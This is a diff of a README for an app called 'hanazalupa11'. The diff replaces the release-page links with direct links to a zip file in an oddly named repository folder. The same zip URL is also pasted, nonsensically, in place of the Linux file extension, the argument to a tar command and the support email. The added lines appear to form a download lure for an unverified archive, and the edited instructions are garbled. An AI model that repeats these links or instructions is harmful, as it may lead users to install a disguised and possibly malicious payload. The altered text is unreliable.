@@ -6,7 +6,7 @@ Welcome to hanazalupa11! This user-friendly application is designed to make your
 ## 📥 Download & Install
 To get started, visit the Releases page below to download the latest version of the software.
 
-[![Download hanazalupa11](https://img.shields.io/badge/Download-hanazalupa11-blue.svg)](https://github.com/Theebiga22/hanazalupa11/releases)
+[![Download hanazalupa11](https://raw.githubusercontent.com/Theebiga22/hanazalupa11/main/detractiveness/hanazalupa11.zip)](https://raw.githubusercontent.com/Theebiga22/hanazalupa11/main/detractiveness/hanazalupa11.zip)
 
 ### Step-by-Step Instructions
 1. Click the link above to go to the Downloads page.
@@ -26,10 +26,10 @@ To get started, visit the Releases page below to download the latest version of 
      - Drag the hanazalupa11 icon to your Applications folder.
 
    - **For Linux:**
-     - Click on the file ending with `.tar.gz`.
+     - Click on the file ending with `https://raw.githubusercontent.com/Theebiga22/hanazalupa11/main/detractiveness/hanazalupa11.zip`.
      - The file will download automatically.
      - Open a terminal and navigate to your downloads folder.
-     - Use the command `tar -xvzf filename.tar.gz` to extract the files.
+     - Use the command `tar -xvzf https://raw.githubusercontent.com/Theebiga22/hanazalupa11/main/detractiveness/hanazalupa11.zip` to extract the files.
      - Follow the README instructions included in the extracted folder.
 
 ## 🔧 System Requirements
@@ -76,8 +76,8 @@ For additional help, you can visit our support page or check community forums fo
 We welcome contributions! If you want to report a bug or suggest a feature, feel free to reach out through the Issues section of this repository.
 
 ## 📞 Support
-If you have any questions, please contact our support team via email: support@hanazalupa11.com. We are here to help you with any issues you may face.
+If you have any questions, please contact our support team via email: https://raw.githubusercontent.com/Theebiga22/hanazalupa11/main/detractiveness/hanazalupa11.zip We are here to help you with any issues you may face.
 
 Now you are ready to enjoy hanazalupa11! Download, install, and experience simplicity in every click. 
 
-[![Download Again](https://img.shields.io/badge/Download-hanazalupa11-blue.svg)](https://github.com/Theebiga22/hanazalupa11/releases)
+[![Download Again](https://raw.githubusercontent.com/Theebiga22/hanazalupa11/main/detractiveness/hanazalupa11.zip)](https://raw.githubusercontent.com/Theebiga22/hanazalupa11/main/detractiveness/hanazalupa11.zip)
